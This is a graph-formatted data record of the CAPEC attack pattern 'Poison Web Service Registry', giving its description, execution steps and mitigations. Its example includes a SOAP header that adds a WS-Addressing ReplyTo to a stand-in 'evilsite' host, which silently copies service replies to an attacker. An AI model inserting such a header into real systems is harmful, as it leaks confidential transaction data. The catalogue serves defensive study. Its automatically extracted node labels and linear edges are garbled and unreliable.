graph [
  directed 1
  capec_id "51"
  name "Poison Web Service Registry"
  abstraction "Detailed"
  status "Draft"
  description "SOA and Web Services often use a registry to perform look up, get schema information, and metadata about services. A poisoned registry can redirect (think phishing for servers) the service requester to a malicious service provider, provide incorrect information in schema or metadata, and delete information about service provider interfaces."
  likelihood "High"
  severity "Very High"
  related_attack_patterns "_networkx_list_start"
  related_attack_patterns [
    capec_id "203"
    nature "ChildOf"
  ]
  prerequisites "_networkx_list_start"
  prerequisites "The attacker must be able to write to resources or redirect access to the service registry."
  skills_required "_networkx_list_start"
  skills_required [
    level "Low"
    description "To identify and execute against an over-privileged system interface"
  ]
  resources_required "_networkx_list_start"
  resources_required "Capability to directly or indirectly modify registry resources"
  consequences [
    scope "Confidentiality"
    scope "Integrity"
    scope "Availability"
    impact "Execute Unauthorized Commands"
  ]
  consequences [
    scope "_networkx_list_start"
    scope "Confidentiality"
    impact "Read Data"
  ]
  consequences [
    scope "_networkx_list_start"
    scope "Integrity"
    impact "Modify Data"
  ]
  mitigations "Design: Enforce principle of least privilege"
  mitigations "Design: Harden registry server and file access permissions"
  mitigations "Implementation: Implement communications to and from the registry using secure protocols"
  example_instances "_networkx_list_start"
  example_instances "WS-Addressing provides location and metadata about the service endpoints. An extremely hard to detect attack is an attacker who updates the WS-Addressing header, leaves the standard service request and service provider addressing and header information intact, but adds an additional WS-Addressing Replyto header. In this case the attacker is able to send a copy (like a cc in mail) of every result the service provider generates. So every query to the bank account service, would generate a reply message of the transaction status to both the authorized service requester and an attacker service. This would be extremely hard to detect at runtime. <S:Header> <wsa:MessageID> http://example.com/Message  </wsa:MessageID>  <wsa:ReplyTo> <wsa:Address>http://valid.example/validClient</wsa:Address>  </wsa:ReplyTo>  <wsa:ReplyTo> <wsa:Address>http://evilsite/evilClient</wsa:Address>  </wsa:ReplyTo>  <wsa:FaultTo> <wsa:Address>http://validfaults.example/ErrorHandler</wsa:Address>  </wsa:FaultTo>  </S:Header> In this example &#34;evilsite&#34; is an additional reply to address with full access to all the messages that the authorized (validClient) has access to. Since this is registered with ReplyTo header it will not generate a Soap fault."
  related_weaknesses "285"
  related_weaknesses "74"
  related_weaknesses "693"
  matched_cwes "285"
  matched_cwes "693"
  matched_cwes "74"
  taxonomy_mappings "[]"
  execution_flow [
    step "1"
    phase "Explore"
    description "[Find a target SOA or Web Service] The adversary must first indentify a target SOA or Web Service."
    techniques "[]"
  ]
  execution_flow [
    step "2"
    phase "Experiment"
    description "[Determine desired outcome] Because poisoning a web service registry can have different outcomes, the adversary must decide how they wish to effect the webservice."
    techniques "An adversary can perform a denial of service attack on a web service."
    techniques "An adversary can redirect requests or responses to a malicious service."
  ]
  execution_flow [
    step "3"
    phase "Experiment"
    description "[Determine if a malicious service needs to be created] If the adversary wishes to redirect requests or responses, they will need to create a malicious service to redirect to."
    techniques "Create a service to that requests are sent to in addition to the legitimate service and simply record the requests."
    techniques "Create a service that will give malicious responses to a service provider."
    techniques "Act as a malicious service provider and respond to requests in an arbitrary way."
  ]
  execution_flow [
    step "4"
    phase "Exploit"
    description "[Poison Web Service Registry] Based on the desired outcome, poison the web service registry. This is done by altering the data at rest in the registry or uploading malicious content by spoofing a service provider."
    techniques "Intercept and change WS-Adressing headers to route to a malicious service or service provider."
    techniques "Provide incorrect information in schema or metadata to cause a denial of service."
    techniques "Delete information about service procider interfaces to cause a denial of service."
  ]
  node [
    id 0
    label "find_target_web_service"
  ]
  node [
    id 1
    label "indentify_a_target_soa_or_web_service"
  ]
  node [
    id 2
    label "desire_outcome"
  ]
  node [
    id 3
    label "induce_denial_of_service"
  ]
  node [
    id 4
    label "redirect_requests_or_responses_to_a_malicious_service"
  ]
  node [
    id 5
    label "wish_to_redirect_requests_or_responses"
  ]
  node [
    id 6
    label "create_a_service_to_that_requests"
  ]
  node [
    id 7
    label "create_a_service_that_will_give_malicious_responses_to_a_service_provider"
  ]
  node [
    id 8
    label "remove_data"
  ]
  node [
    id 9
    label "provide_incorrect_information_in_schema_or_metadata"
  ]
  node [
    id 10
    label "interface_service_procider"
  ]
  node [
    id 11
    label "provide_location_and_metadata"
  ]
  node [
    id 12
    label "detect_attack"
  ]
  node [
    id 13
    label "send_a_copy"
  ]
  node [
    id 14
    label "generate_a_reply_message_of_the_transaction_status"
  ]
  node [
    id 15
    label "have_access_to"
  ]
  node [
    id 16
    label "register_this"
  ]
  node [
    id 17
    label "write_to_resources"
  ]
  edge [
    source 0
    target 1
  ]
  edge [
    source 1
    target 2
  ]
  edge [
    source 2
    target 3
  ]
  edge [
    source 3
    target 4
  ]
  edge [
    source 4
    target 5
  ]
  edge [
    source 5
    target 6
  ]
  edge [
    source 6
    target 7
  ]
  edge [
    source 7
    target 8
  ]
  edge [
    source 8
    target 9
  ]
  edge [
    source 9
    target 10
  ]
  edge [
    source 10
    target 11
  ]
  edge [
    source 11
    target 12
  ]
  edge [
    source 12
    target 13
  ]
  edge [
    source 13
    target 14
  ]
  edge [
    source 14
    target 15
  ]
  edge [
    source 15
    target 16
  ]
  edge [
    source 16
    target 17
  ]
]
